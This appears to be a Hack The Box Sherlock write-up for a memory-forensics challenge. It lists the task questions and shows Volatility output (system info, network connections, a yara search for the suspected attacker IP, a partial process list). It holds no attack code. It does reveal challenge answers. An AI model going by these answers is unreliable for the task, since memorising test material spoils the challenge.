---
title: "HTB Sherlock Mellitus"
date: 2024-06-21T04:55:59-04:00
tags:
  - htb
  - sherlock
  - dfir
  - memory
  - dump
  - volatility
  - evtx
  - evtxecmd
  - windows
  - event
  - zimmerman-tools
  - jq
  - image
  - floss
  - gimp
  - malware
---

# Mellitus - DFIR

### Scenario
You’ve been a SOC analyst for the last 4 years but you’ve been honing your incident response skills! It’s about time you bite the bullet and go for your dream job as an Incident Responder as that’s the path you’d like your career to follow. Currently you are going through the interview process for a medium size incident response internal team and the cocky interviewing responder has given you a tough technical challenge to test your memory forensics aptitude. Can you get all the questions right and secure the job?

### Artifacts
|Artifact|MD5 Hash|Password|Remarks|
|----|----|----|----|
|mellitus.zip|0272fd0c8105b555a1ce17d0959b9cb8|hacktheblue||
|memory_dump.vmem|91a4ae43d463bfb9a9806b7716875415||Windows Memory Dump file of a VM instance.|
|memory_dump.vmsn|c17f871c05286923eb06d5dcb5136297||VMware Snapshot file for the VM instance.|

### Tools
+ Volatility3 and Volatility2
+ EvtxECmd - Zimmerman Tools
+ jq
+ LibreOffice Calc
+ Gimp 2.10.38

### Tasks
1. What was the time on the system when the memory was captured?
2. What is the IP address of the attacker?
3. What is the name of the strange process?
4. What is the PID of the process that launched the malicious binary?
5. What was the command that got the malicious binary onto the machine?
6. The attacker attempted to gain entry to our host via FTP. How many users did they attempt?
7. What is the full URL of the last website the attacker visited?
8. What is the affected users password?
9. There is a flag hidden related to PID 5116. Can you confirm what it is?

### Forensic Analysis
For Task 1 we can analyze the memdump using the following:
```sh
$ vol3 -f memory_dump.vmem windows.info                      
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished                        
Variable        Value

Kernel Base     0xf80638aa5000
DTB     0x1ad000
Symbols file:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/8B11040A5928757B11390AC78F6B6925-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 VmwareLayer
base_layer      2 FileLayer
meta_layer      2 FileLayer
KdVersionBlock  0xf80638ea7dc0
Major/Minor     15.17763
MachineType     34404
KeNumberProcessors      2
SystemTime      2023-10-31 13:59:26
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Thu Oct 28 12:04:50 2060
```

For the task 2 I used the `netscan` plugin to get the IP address. But, I should have first found the malicious process and then analyze the process. Unfortunately, I couldn't dump the malicious process.
```sh
$ vol3 -f memory_dump.vmem windows.netscan
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished                        
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0xc40aa1be7050  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       880     svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa1be71a0  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       472     wininit.exe     2023-10-31 13:30:57.000000 
0xc40aa1be82b0  TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       880     svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa1be82b0  TCPv6   ::      135     ::      0       LISTENING       880     svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa1be8400  TCPv4   0.0.0.0 49664   0.0.0.0 0       LISTENING       472     wininit.exe     2023-10-31 13:30:57.000000 
0xc40aa1be8400  TCPv6   ::      49664   ::      0       LISTENING       472     wininit.exe     2023-10-31 13:30:57.000000 
0xc40aa5394050  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       1208    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa5394440  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       1332    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa53946e0  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       2328    spoolsv.exe     2023-10-31 13:30:58.000000 
0xc40aa53946e0  TCPv6   ::      49667   ::      0       LISTENING       2328    spoolsv.exe     2023-10-31 13:30:58.000000 
0xc40aa5394830  TCPv4   0.0.0.0 49665   0.0.0.0 0       LISTENING       1332    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa5394830  TCPv6   ::      49665   ::      0       LISTENING       1332    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa5394ad0  TCPv4   0.0.0.0 49676   0.0.0.0 0       LISTENING       636     lsass.exe       2023-10-31 13:31:07.000000 
0xc40aa5394ad0  TCPv6   ::      49676   ::      0       LISTENING       636     lsass.exe       2023-10-31 13:31:07.000000 
0xc40aa5394ec0  UDPv4   192.168.157.144 137     *       0               4       System  2023-10-31 13:30:57.000000 
0xc40aa5395160  TCPv4   0.0.0.0 49667   0.0.0.0 0       LISTENING       2328    spoolsv.exe     2023-10-31 13:30:58.000000 
0xc40aa53952b0  TCPv4   192.168.157.144 139     0.0.0.0 0       LISTENING       4       System  2023-10-31 13:30:57.000000 
0xc40aa5395400  UDPv4   192.168.157.144 138     *       0               4       System  2023-10-31 13:30:57.000000 
0xc40aa5395550  UDPv4   0.0.0.0 5353    *       0               1876    svchost.exe     2023-10-31 13:30:58.000000 
0xc40aa5395550  UDPv6   ::      5353    *       0               1876    svchost.exe     2023-10-31 13:30:58.000000 
0xc40aa53956a0  UDPv4   0.0.0.0 5353    *       0               1876    svchost.exe     2023-10-31 13:30:58.000000 
0xc40aa5395940  TCPv4   0.0.0.0 49676   0.0.0.0 0       LISTENING       636     lsass.exe       2023-10-31 13:31:07.000000 
0xc40aa5395a90  TCPv4   0.0.0.0 49666   0.0.0.0 0       LISTENING       1208    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa5395a90  TCPv6   ::      49666   ::      0       LISTENING       1208    svchost.exe     2023-10-31 13:30:57.000000 
0xc40aa5395be0  UDPv4   0.0.0.0 0       *       0               1876    svchost.exe     2023-10-31 13:30:58.000000 
0xc40aa5395be0  UDPv6   ::      0       *       0               1876    svchost.exe     2023-10-31 13:30:58.000000 
0xc40aa5395d30  TCPv6   ::1     8888    ::      0       LISTENING       2896    python.exe      2023-10-31 13:37:16.000000 
0xc40aa58f3050  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       620     services.exe    2023-10-31 13:30:59.000000 
0xc40aa58f3ec0  UDPv4   0.0.0.0 5050    *       0               3728    svchost.exe     2023-10-31 13:31:00.000000 
0xc40aa58f4160  UDPv4   127.0.0.1       64872   *       0               3236    svchost.exe     2023-10-31 13:30:59.000000 
0xc40aa58f4940  TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  2023-10-31 13:30:59.000000 
0xc40aa58f4940  TCPv6   ::      445     ::      0       LISTENING       4       System  2023-10-31 13:30:59.000000 
0xc40aa58f4a90  TCPv4   0.0.0.0 49668   0.0.0.0 0       LISTENING       620     services.exe    2023-10-31 13:30:59.000000 
0xc40aa58f4a90  TCPv6   ::      49668   ::      0       LISTENING       620     services.exe    2023-10-31 13:30:59.000000 
0xc40aa5ac6530  TCPv4   127.0.0.1       49867   127.0.0.1       49868   ESTABLISHED     -       -       N/A
0xc40aa5d25a30  TCPv4   192.168.157.144 50043   142.250.187.206 443     ESTABLISHED     -       -       N/A
0xc40aa5efe050  TCPv6   ::1     14147   ::      0       LISTENING       11048   FileZillaServe  2023-10-31 13:37:41.000000 
0xc40aa5efe1a0  TCPv6   7f00:1::9870:b5a1:ac4:ffff      8005    ::      0       LISTENING       2696    java.exe        2023-10-31 13:37:50.000000 
0xc40aa5efe2f0  TCPv4   0.0.0.0 443     0.0.0.0 0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa5efe2f0  TCPv6   ::      443     ::      0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa5efe590  UDPv4   0.0.0.0 0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aa5efe830  TCPv4   0.0.0.0 7680    0.0.0.0 0       LISTENING       8444    svchost.exe     2023-10-31 13:32:59.000000 
0xc40aa5efe830  TCPv6   ::      7680    ::      0       LISTENING       8444    svchost.exe     2023-10-31 13:32:59.000000 
0xc40aa5efe980  TCPv4   0.0.0.0 21      0.0.0.0 0       LISTENING       11048   FileZillaServe  2023-10-31 13:37:41.000000 
0xc40aa5efed70  TCPv4   0.0.0.0 443     0.0.0.0 0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa5eff160  TCPv4   127.0.0.1       14147   0.0.0.0 0       LISTENING       11048   FileZillaServe  2023-10-31 13:37:41.000000 
0xc40aa5eff400  TCPv4   0.0.0.0 8080    0.0.0.0 0       LISTENING       2696    java.exe        2023-10-31 13:37:48.000000 
0xc40aa5eff400  TCPv6   ::      8080    ::      0       LISTENING       2696    java.exe        2023-10-31 13:37:48.000000 
0xc40aa5effd30  TCPv4   0.0.0.0 3306    0.0.0.0 0       LISTENING       5212    mysqld.exe      2023-10-31 13:37:41.000000 
0xc40aa5effd30  TCPv6   ::      3306    ::      0       LISTENING       5212    mysqld.exe      2023-10-31 13:37:41.000000 
0xc40aa5effe80  TCPv4   0.0.0.0 21      0.0.0.0 0       LISTENING       11048   FileZillaServe  2023-10-31 13:37:41.000000 
0xc40aa5effe80  TCPv6   ::      21      ::      0       LISTENING       11048   FileZillaServe  2023-10-31 13:37:41.000000 
0xc40aa60fc1a0  UDPv6   ::1     1900    *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fc2f0  UDPv6   ::1     56182   *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fc440  UDPv4   127.0.0.1       1900    *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fc6e0  UDPv4   192.168.157.144 56183   *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fcad0  UDPv4   192.168.157.144 1900    *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fd6a0  UDPv6   fe80::a94d:3c5d:b0c7:221b       56181   *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fd7f0  UDPv4   127.0.0.1       56184   *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fd940  TCPv4   127.0.0.1       8888    0.0.0.0 0       LISTENING       2896    python.exe      2023-10-31 13:37:16.000000 
0xc40aa60fda90  UDPv6   fe80::a94d:3c5d:b0c7:221b       1900    *       0               8140    svchost.exe     2023-10-31 13:31:20.000000 
0xc40aa60fdd30  TCPv4   0.0.0.0 80      0.0.0.0 0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa60fde80  TCPv4   0.0.0.0 80      0.0.0.0 0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa60fde80  TCPv6   ::      80      ::      0       LISTENING       11204   httpd.exe       2023-10-31 13:37:41.000000 
0xc40aa615a980  TCPv4   0.0.0.0 5040    0.0.0.0 0       LISTENING       3728    svchost.exe     2023-10-31 13:31:02.000000 
0xc40aa6b569a0  TCPv4   192.168.157.144 49772   20.90.152.133   443     ESTABLISHED     -       -       N/A
0xc40aa6f40b50  TCPv4   127.0.0.1       49868   127.0.0.1       49867   ESTABLISHED     -       -       N/A
0xc40aa9005bf0  TCPv4   127.0.0.1       14147   127.0.0.1       49889   ESTABLISHED     -       -       N/A
0xc40aa90e0bf0  TCPv4   127.0.0.1       49889   127.0.0.1       14147   ESTABLISHED     -       -       N/A
0xc40aa912ebe0  TCPv4   192.168.157.144 50042   216.58.204.67   443     ESTABLISHED     -       -       N/A
0xc40aa98d66a0  TCPv4   192.168.157.144 49920   95.101.243.61   443     CLOSED  -       -       N/A
0xc40aa98e1950  TCPv4   192.168.157.144 49921   95.101.63.170   443     CLOSED  -       -       N/A
0xc40aa99986d0  TCPv4   192.168.157.144 50045   13.107.21.200   443     ESTABLISHED     -       -       N/A
0xc40aaa0fa050  UDPv4   0.0.0.0 0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aaa0fa050  UDPv6   ::      0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aaa0fa1a0  UDPv4   0.0.0.0 5355    *       0               1876    svchost.exe     2023-10-31 13:55:22.000000 
0xc40aaa0fa440  UDPv4   0.0.0.0 5353    *       0               8048    chrome.exe      2023-10-31 13:55:31.000000 
0xc40aaa0fa590  UDPv4   0.0.0.0 0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aaa0fac20  UDPv4   0.0.0.0 5353    *       0               8048    chrome.exe      2023-10-31 13:55:31.000000 
0xc40aaa0fac20  UDPv6   ::      5353    *       0               8048    chrome.exe      2023-10-31 13:55:31.000000 
0xc40aaa0fb160  UDPv4   0.0.0.0 5355    *       0               1876    svchost.exe     2023-10-31 13:55:22.000000 
0xc40aaa0fb160  UDPv6   ::      5355    *       0               1876    svchost.exe     2023-10-31 13:55:22.000000 
0xc40aaa0fba90  UDPv4   0.0.0.0 0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aaa0fba90  UDPv6   ::      0       *       0               6772    powershell.exe  2023-10-31 13:42:37.000000 
0xc40aaa5d7920  TCPv4   192.168.157.144 50044   204.79.197.222  443     ESTABLISHED     -       -       N/A
0xc40aaa7f79a0  TCPv4   192.168.157.144 50037   192.168.157.151 4545    ESTABLISHED     -       -       N/A
0xc40aaa8cb8a0  TCPv4   192.168.157.144 50041   216.58.204.78   443     ESTABLISHED     -       -       N/A
0xc40aaa8d7920  TCPv4   192.168.157.144 50039   20.31.169.57    443     CLOSED  -       -       N/A
```

I tried to find the malicious process but I couldn't find any weird looking process. My mind tricked me. So, I did a IP IoC search using yara.

```sh
$ vol3 -f memory_dump.vmem windows.vadyarascan --yara-rules "192.168.157.151"
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished                        
Offset  PID     Rule    Component       Value

0x12326865bdb   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x12330fabadb   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x12330fadaa0   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x12330fb7b1e   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x12330fb9ae0   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x123373fc8a0   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x1233f9c69f0   3360    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x61008b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6100e3        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x61013b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x61034b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6105b3        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6106c9        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6108a1        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6108ec        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x61093c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x6109dc        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610a31        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610b6c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610bc1        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610c11        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610c61        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610f2c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x610fc3        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x611021        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x787b0c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b03b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b0cb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b23c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b30b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b361        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b3a9        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b3ec        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b50c        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b554        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b593        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b5db        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78b623        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78bac1        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78c5eb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78c8db        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78c9a4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78c9fb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cabb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cb24        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cb7b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cbe4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cc44        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cca4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78ccfb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cdc4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78ce1b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cedb        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78cfa4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78d93b        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e1f4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e2d4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e494        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e574        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e5e9        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e654        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e739        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x78e7a4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x8040fc        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x811bd4        11048   r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56baa8        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56c1c3        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56c42b        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56c84b        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56d659        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56d698        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56d722        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x56d782        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x5e839c        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x5ebd97        9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x240342b       9880    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495c9741cd   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495ca7531f   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495ce0690b   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495ce075c3   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495ce1ae28   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
0x2495ce1aea0   6772    r1      $a      31 39 32 2e 31 36 38 2e 31 35 37 2e 31 35 31
```

Than I did a `pslist`.

```sh
$ vol3 -f memory_dump.vmem windows.pslist                                    
Volatility 3 Framework 2.7.1
Progress:  100.00               PDB scanning finished                        
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

4       0       System  0xc40aa0e85280  103     -       N/A     False   2023-10-31 13:30:55.000000      N/A     Disabled
88      4       Registry        0xc40aa0ee7080  4       -       N/A     False   2023-10-31 13:30:50.000000      N/A     Disabled
280     4       smss.exe        0xc40aa1cb12c0  2       -       N/A     False   2023-10-31 13:30:55.000000      N/A     Disabled
392     384     csrss.exe       0xc40aa1c32140  11      -       0       False   2023-10-31 13:30:56.000000      N/A     Disabled
472     384     wininit.exe     0xc40aa484e080  1       -       0       False   2023-10-31 13:30:56.000000      N/A     Disabled
620     472     services.exe    0xc40aa49a90c0  8       -       0       False   2023-10-31 13:30:56.000000      N/A     Disabled
636     472     lsass.exe       0xc40aa49cd0c0  8       -       0       False   2023-10-31 13:30:56.000000      N/A     Disabled
740     620     svchost.exe     0xc40aa503b280  1       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
776     472     fontdrvhost.ex  0xc40aa50a2180  5       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
796     620     svchost.exe     0xc40aa50ad280  12      -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
880     620     svchost.exe     0xc40aa510d300  13      -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
936     620     svchost.exe     0xc40aa517f280  5       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
764     620     svchost.exe     0xc40aa521b300  2       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
396     620     svchost.exe     0xc40aa539e340  3       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1032    620     svchost.exe     0xc40aa539f080  7       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1040    620     svchost.exe     0xc40aa53a0080  2       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1096    620     svchost.exe     0xc40aa53e32c0  1       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1104    620     svchost.exe     0xc40aa53e5340  3       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1208    620     svchost.exe     0xc40aa5421280  6       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1292    620     svchost.exe     0xc40aa546a280  6       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1332    620     svchost.exe     0xc40aa546d340  8       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1356    620     svchost.exe     0xc40aa5470340  2       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1404    620     svchost.exe     0xc40aa54b54c0  8       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1468    620     svchost.exe     0xc40aa0f4f080  3       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1476    620     svchost.exe     0xc40aa5527300  1       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1548    620     svchost.exe     0xc40aa552c340  5       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1584    620     svchost.exe     0xc40aa0eea080  2       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1668    620     svchost.exe     0xc40aa0eae080  4       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1680    620     svchost.exe     0xc40aa0ebb080  3       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1696    620     svchost.exe     0xc40aa0f93080  3       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1804    4       MemCompression  0xc40aa55a2080  122     -       N/A     False   2023-10-31 13:30:57.000000      N/A     Disabled
1836    620     svchost.exe     0xc40aa495e280  2       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1852    620     svchost.exe     0xc40aa55a7340  7       -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1876    620     svchost.exe     0xc40aa55e4340  10      -       0       False   2023-10-31 13:30:57.000000      N/A     Disabled
1928    620     svchost.exe     0xc40aa561c2c0  3       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
1944    620     svchost.exe     0xc40aa494e300  6       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
984     620     svchost.exe     0xc40aa56b0080  11      -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2052    620     svchost.exe     0xc40aa5763300  10      -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2108    620     svchost.exe     0xc40aa5769340  3       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2128    620     svchost.exe     0xc40aa576c080  4       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2184    620     svchost.exe     0xc40aa58472c0  8       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2200    620     svchost.exe     0xc40aa5848080  6       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2328    620     spoolsv.exe     0xc40aa58c3280  7       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2352    620     svchost.exe     0xc40aa58ca340  2       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2396    620     svchost.exe     0xc40aa58ec540  14      -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2440    620     svchost.exe     0xc40aa595c340  5       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2600    620     svchost.exe     0xc40aa599f280  23      -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
2884    620     svchost.exe     0xc40aa5a772c0  4       -       0       False   2023-10-31 13:30:58.000000      N/A     Disabled
3196    620     svchost.exe     0xc40aa5b86340  5       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3204    620     svchost.exe     0xc40aa5b87080  8       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3212    620     svchost.exe     0xc40aa5be1340  15      -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3236    620     svchost.exe     0xc40aa5c29280  7       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3292    620     svchost.exe     0xc40aa5a63080  7       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3316    620     svchost.exe     0xc40aa5c5e2c0  3       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3324    620     vmtoolsd.exe    0xc40aa5c652c0  11      -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3332    620     VGAuthService.  0xc40aa5c60340  2       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3352    620     svchost.exe     0xc40aa5c64080  6       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3360    620     MsMpEng.exe     0xc40aa5c67380  25      -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3568    620     svchost.exe     0xc40aa5d4f340  2       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3608    796     WmiPrvSE.exe    0xc40aa5d49080  9       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
3728    620     svchost.exe     0xc40aa5e0b300  8       -       0       False   2023-10-31 13:30:59.000000      N/A     Disabled
932     620     dllhost.exe     0xc40aa5fc4080  10      -       0       False   2023-10-31 13:31:00.000000      N/A     Disabled
4688    620     msdtc.exe       0xc40aa61ca0c0  9       -       0       False   2023-10-31 13:31:02.000000      N/A     Disabled
3928    620     svchost.exe     0xc40aa62dc080  2       -       0       False   2023-10-31 13:31:03.000000      N/A     Disabled
4104    620     svchost.exe     0xc40aa630c2c0  8       -       0       False   2023-10-31 13:31:03.000000      N/A     Disabled
5156    620     SearchIndexer.  0xc40aa65b90c0  18      -       0       False   2023-10-31 13:31:05.000000      N/A     Disabled
5692    620     NisSrv.exe      0xc40aa66430c0  4       -       0       False   2023-10-31 13:31:08.000000      N/A     Disabled
